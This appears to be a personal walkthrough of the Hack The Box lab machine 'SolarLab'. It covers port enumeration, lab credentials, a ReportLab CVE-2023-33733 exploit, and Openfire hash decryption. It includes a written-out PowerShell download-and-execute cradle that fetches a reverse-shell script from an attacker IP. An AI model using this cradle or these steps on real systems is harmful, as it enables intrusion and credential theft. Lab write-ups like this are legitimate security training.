# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/4hKxtsW.png)
- User
	- BLAKE BYTE
	- CLAUDIA SPRINGER
	- ALEXANDER KNIGHT
	- Paul Squillace
	- Katy Brown
	- Gayle.Rennie
	- Alison Melville
	- Jackie
	- Paul Serban
#### Port `80`
![](https://i.imgur.com/vKQ88FF.png)
![](https://i.imgur.com/PHKgajz.png)

- `With military-grade encryption technology and cutting-edge security measures, your conversations are safe from prying eyes.`
- Some Injectable path: `http://solarlab.htb/?first_name=rere&last_name=reer&contact_email=rex%40rex.com&contact_subject=dasdas&message=dsadsa`
![](https://i.imgur.com/dHrRlGs.png)

#### Port `445`
![](https://i.imgur.com/NRyKf02.png)
![](https://i.imgur.com/oVOlUWZ.png)
![](https://i.imgur.com/XF6WQFE.png)
```
Amazon.com  101-333 Alexander.knight@gmail.com  al;ksdhfewoiuh
Pefcu   A233J   KAlexander  dkjafblkjadsfgl
Chase       Alexander.knight@gmail.com  d398sadsknr390
Fidelity        blake.byte  ThisCanB3typedeasily1@
Signa       AlexanderK  danenacia9234n
        ClaudiaS    dadsfawe9dafkn
```
- The smb works with any account
#### Port `6791`
![](https://i.imgur.com/wwK6i0E.png)
- If you enter Wrong User name it says "user not found" but if it is correct username it says error
![](https://i.imgur.com/p2IRTVG.png)
- Users
	- AlexanderK : bitchs
	- ClaudiaS : kitty2
- ![](https://i.imgur.com/tT4T91M.png)
![](https://i.imgur.com/ThBznbq.png)
![](https://i.imgur.com/XQVQIuM.png)

- ` blakeb : ThisCanB3typedeasily1@ `
### Gaining Access
![](https://i.imgur.com/nEkwAUH.png)
https://github.com/c53elyas/CVE-2023-33733
- Just Dont use the `<para>` use `<p>`

![](https://i.imgur.com/rmJ183W.png)
![](https://i.imgur.com/aWIZ5ET.png)

![](https://i.imgur.com/qkF1r7P.png)

![](https://i.imgur.com/9Kjnmgn.png)
 - Deliverying payload
	 -  I made a nishang payload and base64 IEX ![](https://i.imgur.com/hzllKzT.png)
	 - `echo "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.99/shell.ps1')"  | iconv -t UTF-16LE | base64 -w 0` ![](https://i.imgur.com/PEZb1Dm.png)
	- ![](https://i.imgur.com/nDh4XkN.png)
## Internal
### Enumeration
```
   Directory: C:\Users\blake\Documents\app\reports\instance


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/17/2023  12:11 PM          12288 users.db


    Directory: C:\Users\blake\Documents\app\instance


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/2/2024  12:30 PM          12288 users.db

    Directory: C:\Users\blake\Documents\app


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/2/2024  12:30 PM                instance
d-----         5/12/2024   3:14 PM                reports
d-----        11/17/2023  10:01 AM                static
d-----        11/17/2023  10:01 AM                templates
d-----         5/12/2024   3:10 PM                __pycache__
-a----        11/17/2023   9:59 AM           1278 app.py
-a----        11/16/2023   2:17 PM            315 models.py
-a----        11/18/2023   6:59 PM           7790 routes.py
-a----          5/2/2024   6:26 PM           3352 utils.py
```
![](https://i.imgur.com/XLHfhQl.png)
```shell
PS C:\Users\blake\Documents\app\instance> sqlite users.db
sqlite> select * from user;
1|blakeb|ThisCanB3typedeasily1@
2|claudias|007poiuytrewq
3|alexanderk|HotP!fireguard
```
### Gaining Access
![](https://i.imgur.com/fI8dXNj.png)
![](https://i.imgur.com/p28VAHB.png)
`C:\Windows\Panther\Unattend.xml`
![](https://i.imgur.com/pIV5lcQ.png)
![](https://i.imgur.com/4oEZhbF.png)
![](https://i.imgur.com/E2yFZ2N.png)
- I dont know the password
- ![](https://i.imgur.com/XPaDvWG.png)
- The Openfire is not accessable.
- Then I remember the user Openfire, and tried all the password i have from the database. and i got shell with it.
	- ![](https://i.imgur.com/oo8ZtaN.png)- 
- Now i can access the file
	- ![](https://i.imgur.com/ous88OU.png)
### Maintaining Access
![](https://i.imgur.com/VDwE3KP.png)
- the hash is not being cracked by hashcat so..  checked for openfire hash cracks
	- ![](https://i.imgur.com/GdxomTw.png)
- https://github.com/c0rdis/openfire_decrypt
![](https://i.imgur.com/Z3vfmDf.png)
```shell
CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))

<SNIP>


INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')


# Summary
pass: becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442
serverkey: 9MwNQcJ9bF4YeyZDdns5gvXp620=
storedkey: gjMoswpK+HakPdvLIvp6eLKlYh0=

```
![](https://i.imgur.com/81RSr2C.png)
![](https://i.imgur.com/wMXLA8q.png)
- Finally Cracked it
```shell
rexder@HunterDragon ~/C/H/m/s/openfire_decrypt (master) [1]> java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
```
` admin : ThisPasswordShouldDo!@ `
we are innnn
![](https://i.imgur.com/R7FSGf7.png)
![](https://i.imgur.com/1ZXTRbH.png)
![](https://i.imgur.com/CUoKhde.png)

# Random Notes